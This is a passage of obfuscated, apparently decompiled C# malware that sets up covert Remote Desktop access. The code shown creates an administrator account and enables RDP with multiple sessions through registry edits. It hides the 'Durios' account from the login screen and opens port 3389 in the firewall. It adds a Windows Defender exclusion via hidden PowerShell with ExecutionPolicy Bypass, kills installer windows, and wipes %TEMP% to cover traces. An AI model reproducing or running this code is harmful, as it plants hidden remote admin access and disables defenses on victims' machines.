        user3.SetPassword(newPassword3);
        user3.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user3.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal3 = (GroupPrincipal) null;
        try
        {
          groupPrincipal3 = GroupPrincipal.FindByIdentity(context3, "Administrators");
          if (groupPrincipal3 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal3.Members.Contains(context3, IdentityType.SamAccountName, identityValue3))
            {
              Console.WriteLine("Administrators already contains " + identityValue3);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal3.Members.Add(user3);
            groupPrincipal3.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal3.Dispose();
        user3.Dispose();
        context3.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
    }
  }

  public static void 䉼\uE151\uE3ACⱆ刴\uF61D\u170D吝獵࡛\uFFFD뾴땥ꚗ簋\u2156汒蒊ᓻ餗()
  {
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
    if (registryKey1 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey1 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    }
    else
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    registryKey1.Flush();
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey2 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
      registryKey2.SetValue("UserAuthentication", (object) 1);
    }
    else
      registryKey2.SetValue("UserAuthentication", (object) 1);
    registryKey2.Flush();
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
    if (registryKey3 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey3.Flush();
    RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey4 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey4.Flush();
    try
    {
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      if (registryKey5 != null && registryKey5.GetValue("Durios") != null)
        registryKey5.SetValue("Durios", (object) "0");
      Console.WriteLine("Durios desactivated");
    }
    catch (Exception ex)
    {
      㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.觔䋷\u250C彽黛ᠮ稫\uEEA6㙞鐆\uED0F굑\uE001톳ใ\uFFFD棬뮧笪䘨("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Durios -PropertyType DWord -Value 0 -Force");
    }
    RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
    if (registryKey6 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      registryKey6.SetValue("Durios", (object) 0);
    }
    else
      registryKey6.SetValue("Durios", (object) 0);
    registryKey6.Flush();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  public static void 觔䋷\u250C彽黛ᠮ稫\uEEA6㙞鐆\uED0F굑\uE001톳ใ\uFFFD棬뮧笪䘨(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();

  public static void 骒뼝屾\uFFFDℙ憖䧕\uFD45祯ᢠ䮯뼑\uFD4D็癑놧ᗝ㜬ᔥ嘉()
  {
    string str1 = "cmd";
    string str2 = "conhost";
    string str3 = "installrdp";
    string str4 = "rdpinstall";
    string str5 = "updaterdp";
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str1))
        process.Kill();
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str5))
        process.Kill();
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str4))
        process.Kill();
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str3))
        process.Kill();
    }
    foreach (Process process in Process.GetProcesses())
    {
      if (process.MainWindowTitle.Contains(str2))
        process.Kill();
    }
  }

  public static void 棦ȡ훬뙎爸ط낉띡\u19FA脎⳱같찠㤘쏷稾\u2653\uE121厤쁔() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public delegate void \uE2ABኸ绗\uF885\uEFFAꊻ奺\uF46F\u2086祘ᗄἥ鏱䫇뱰돪\uE476ℍ䝉\uE341();
}
